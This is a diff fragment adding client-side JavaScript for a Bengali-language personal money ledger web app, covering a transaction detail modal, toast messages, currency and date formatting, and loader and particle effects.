+    <button class="btn btn-ghost btn-sm" style="font-size:10px" onclick="promptRecover('${r.id}','${r.kind}')">♻️ ফিরাও</button>
+    <button class="btn btn-danger btn-sm" style="font-size:10px" onclick="permanentDelete('${r.id}')">✕ মুছুন</button>
+  </div>
+  </div>`;
+}
+
+// ═══ DETAIL MODAL ═══
+function showDetail(id,kind){
+  const arr=kind==='dilam'?allDilam:allPelam;
+  const item=arr.find(r=>r.id===id);
+  if(!item) return;
+  const isD=kind==='dilam';
+  const dt=item.createdAt?.toDate?.()??new Date(item.createdAt??Date.now());
+  const rows=[
+    ['পরিমাণ',fmtBn(item.amount||0),isD?'var(--green)':'var(--accent)'],
+    ...(isD&&item.dilamType==='cashout'?[['ধরন','ক্যাশ আউট (+১.৮৫%)','var(--gold)']]: isD?[['ধরন','স্বাভাবিক','var(--text2)']]: []),
+    ...(!isD&&item.commission?[['কমিশন',fmtBn(item.commission),'var(--gold)'],['কমিশন %',item.commType||'—','var(--gold)']]:[] ),
+    ...(item.note?[['বিবরণ',esc(item.note),'var(--text)']]: []),
+    ['তারিখ',fmtDate(dt,true),'var(--text2)'],
+  ];
+  document.getElementById('detail-content').innerHTML=`
+  <div style="text-align:center;margin-bottom:16px">
+    <div style="font-size:40px;margin-bottom:7px">${isD?'💸':'💰'}</div>
+    <h3 style="font-size:16px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif">${isD?'টাকা দিলাম':'টাকা পেলাম'}</h3>
+  </div>
+  <div style="background:var(--surface2);border:1px solid var(--border);border-radius:11px;padding:12px;margin-bottom:14px">
+    ${rows.map(([l,v,c])=>`<div class="data-row"><span class="data-row-label">${l}</span><span class="data-row-value" style="color:${c}">${v}</span></div>`).join('')}
+  </div>
+  <div style="display:flex;gap:10px">
+    <button class="btn btn-ghost" style="flex:1;font-size:13px" onclick="closeModal('modal-detail')">বন্ধ</button>
+    <button class="btn btn-danger" style="flex:1;font-size:13px" onclick="closeModal('modal-detail');promptDelete('${id}','${kind}')">🗑️ ডিলিট</button>
+  </div>`;
+  openModal('modal-detail');
+}
+
+// ═══ MODAL HELPERS ═══
+function openModal(id){document.getElementById(id).style.display='flex';}
+function closeModal(id){document.getElementById(id).style.display='none';}
+
+// ═══ TOAST ═══
+function toast(msg,type='green'){
+  const wrap=document.getElementById('toast-wrap');
+  const el=document.createElement('div');
+  el.className=`toast toast-${type}`;el.textContent=msg;
+  wrap.appendChild(el);
+  setTimeout(()=>{el.style.opacity='0';el.style.transition='opacity .3s';setTimeout(()=>el.remove(),300);},2800);
+}
+
+// ═══ HELPERS ═══
+function fmtBn(n){
+  if(!n&&n!==0) return'৳০.০০';
+  return'৳'+parseFloat(n).toLocaleString('bn-BD',{minimumFractionDigits:2,maximumFractionDigits:2});
+}
+function fmtNum(n){return parseFloat(n||0).toFixed(2);}
+function fmtDate(d,full=false){
+  if(!d) return'—';
+  const dt=d instanceof Date?d:(d?.toDate?d.toDate():new Date(d));
+  if(isNaN(dt)) return'—';
+  if(full) return dt.toLocaleString('bn-BD',{dateStyle:'full',timeStyle:'short'});
+  return dt.toLocaleString('bn-BD',{day:'numeric',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'});
+}
+function esc(str){
+  if(!str) return'';
+  const div=document.createElement('div');div.textContent=String(str);return div.innerHTML;
+}
+function showErr(el,msg){el.textContent=msg;el.classList.add('show');setTimeout(()=>el.classList.remove('show'),4000);}
+
+// ═══ PAGE LOADER ═══
+window.addEventListener('load',()=>{
+  const bar=document.getElementById('loaderBar');
+  const loader=document.getElementById('pageLoader');
+  setTimeout(()=>{if(bar) bar.style.width='100%';},50);
+  setTimeout(()=>{if(loader){loader.style.opacity='0';setTimeout(()=>loader.remove(),500);}},1200);
+});
+
+// ═══ PARTICLES ═══
+(function(){
+  for(let i=0;i<12;i++){
+    const p=document.createElement('div');p.className='particle';
+    p.style.left=Math.random()*100+'vw';
+    p.style.animationDuration=(Math.random()*18+12)+'s';
+    p.style.animationDelay=(Math.random()*15)+'s';
+    p.style.opacity=Math.random()*.15+.03;
+    const s=Math.random()>.7?'3px':'2px';p.style.width=s;p.style.height=s;
+    document.body.appendChild(p);
+  }
+})();
+</script>
+</body>
+</html>
